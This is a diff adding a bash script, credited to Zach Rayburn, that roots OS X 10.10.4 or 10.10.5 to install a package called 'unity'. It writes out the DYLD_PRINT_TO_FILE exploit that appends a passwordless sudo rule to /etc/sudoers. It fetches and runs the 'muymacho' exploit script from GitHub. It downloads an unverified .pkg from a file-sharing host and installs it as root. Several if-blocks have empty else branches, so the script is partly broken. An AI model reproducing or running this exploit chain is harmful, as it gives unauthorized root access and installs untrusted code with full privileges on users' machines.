@@ -1,0 +1,68 @@
+#!/bin/bash
+echo; echo
+echo ' ____ ___      .__                     '
+echo '|    |   \____ |__| __________   ____'
+echo '|    |   /    \|  |/  ___/  _ \ /    \'
+echo '|    |  /   |  \  |\___ (  <_> )   |  \'
+echo '|______/|___|  /__/____  >____/|___|  /'
+echo '             \/        \/           \/'
+echo
+echo "Created by:"
+echo "Zach Rayburn"
+echo
+
+#--- PRESCRIPTING ---#
+dir=~/tmp$$/
+echo "Making temporary directory..."
+mkdir -v $dir
+echo "Done."
+
+#--- FETCH EXPLOITS ---#
+curl https://raw.githubusercontent.com/luismiras/muymacho/master/muymacho.py > $dir/macho.py
+
+#--- EXPLOIT MACHINE ---#
+function rocket { echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp }
+function macho {
+  cd $dir
+  python macho.py
+}
+echo "What version of osx are you using? (10.10.4 or 10.10.5)"
+read answer
+if [ $answer = 10.10.4 ];
+  then
+    rocket
+  else
+fi
+if [ $answer = 10.10.5 ];
+  then
+    macho
+  else
+fi
+
+#--- CHECK FOR ROOT ---#
+if [[ $EUID -ne 0 ]]
+then
+  echo -e "\033[1mFailed! No root!\033[0m"
+  exit 1
+else
+fi
+
+#--- FETCH UNITY ---#
+echo "Downloading unity..."
+curl -# http://s000.tinyupload.com/download.php?file_id=03173299314515671549&t=0317329931451567154942975 > $dir/unity.pkg
+echo "Done"
+
+#--- INSTALL ---#
+echo "Installing unity..."
+sudo installer -pkg $dir/unity.pkg -target /
+echo "Done"
+
+#--- CLEANUP ---#
+rm -r $dir
+echo "Removing root..."
+sudo sed -i "" "/NOPASSWD:ALL/d" /etc/sudoers
+echo "Done"
+echo
+
+echo "Completed press any key to exit..."
+read useless
